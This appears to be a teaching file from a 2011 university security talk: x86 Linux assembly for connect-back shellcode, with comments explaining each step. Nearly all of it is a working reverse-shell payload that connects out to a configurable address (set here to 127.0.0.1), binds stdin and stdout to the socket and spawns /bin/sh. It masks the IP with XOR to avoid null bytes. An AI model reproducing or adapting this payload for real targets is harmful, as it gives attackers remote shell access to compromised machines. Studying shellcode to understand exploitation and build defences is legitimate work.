;; Talk at Pwnies: Advanced shellcode
;; DIKU, fall 2011
;;
;; Morten Brøns-Pedersen
;;
;; Connect-back type shellcode. Focus is on readability, so not minimal in any
;; way.
;;
;; The general idea is to
;;  1) Connect to a socket that you keep open somewhere.
;;  2) Bind STD_IN and STD_OUT to that socket
;;  3) Spawn a shell. The shell will now use your socket as STD_IN and STD_OUT
;;     You can also bind STD_ERR if you want to.
;;
;; Section 2 of the man pages describe system calls, so to get started you might
;; want to `man 2 [socket|connect|dup2]`. In the man page for `connect` a type
;; `sockaddr` is mentioned. It is defined in [1], but you may also want to take
;; a look at [2].
;;
;; By convention 'network order' is big endian. When programming with sockets
;; one usually uses library functions to convert to and from network ordering.
;; But we don't have that luxury, so be careful to make the convention by hand
;; if necessary (I bet you are on a little endian system, so it probably is).
;;
;; Most of the constants used in the code can be found in [1] and [3].
;;
%define IP     0x0100007F ; = 127.0.0.1
%define IPMASK 0x10101010
%define PORT   0x975C     ; = 23703
;;
;; [1] /usr/include/netinet/in.h
;; [2] http://beej.us/guide/bgnet/output/html/multipage/sockaddr_inman.html
;; [3] /usr/include/bits/socket.h
;;
;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        bits 32
        %include "32.asm"
        ;; addr   : esp + 12   (16 bytes)
        ;; sock   : esp        ( 4 bytes)
        ;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        ;; addr = {(short int) AF_INET
        ;;       , (short int) PORT
        ;;       , (int)       IP
        ;;        };
        ;; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        ;; connect (sock, &addr, 16);
        ;; dub2(sock, 0); // STD_IN
        ;; dub2(sock, 1); // STD_OUT
        ;; execve("/bin/sh", NULL, NULL);
        ;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        ;; int 0x3
        xor eax, eax
        mov [esp + 12], byte AF_INET
        mov [esp + 13], al
        mov [esp + 14], word PORT
        mov [esp + 16], dword (IP ^ IPMASK)
        xor [esp + 16], dword IPMASK
        ;; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        mov al, byte AF_INET
        mov [esp], eax
        mov al, byte SOCK_STREAM
        mov [esp + 4], eax
        mov al, byte IPPROTO_TCP
        mov [esp + 8], eax
        mov al, SYS_socketcall
        xor ebx, ebx
        mov bl, SYS_socketcall_socket
        mov ecx, esp
        int 0x80
        mov [esp], eax
        ;; connect (sock, &addr, 16);
        lea edx, [esp + 12]
        mov [esp + 4], edx
        mov [esp + 8], byte 16
        xor eax, eax
        mov al, SYS_socketcall
        xor ebx, ebx
        mov bl, SYS_socketcall_connect
        mov ecx, esp
        int 0x80
        ;; dub2(sock, 0)
        xor eax, eax
        mov al, SYS_dup2
        mov ebx, [esp]
        xor ecx, ecx
        int 0x80
        ;; dub2(sock, 1)
        xor eax, eax
        mov al, SYS_dup2
        mov ebx, [esp]
        inc ecx
        int 0x80
        ;; Put "/bin//sh" on the stack
        xor eax, eax
        mov [esp], dword "/bin"
        mov [esp + 4], dword "//sh"
        mov [esp + 8], eax
        ;; execve("/bin/sh", NULL, NULL)
        mov al, SYS_execve
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
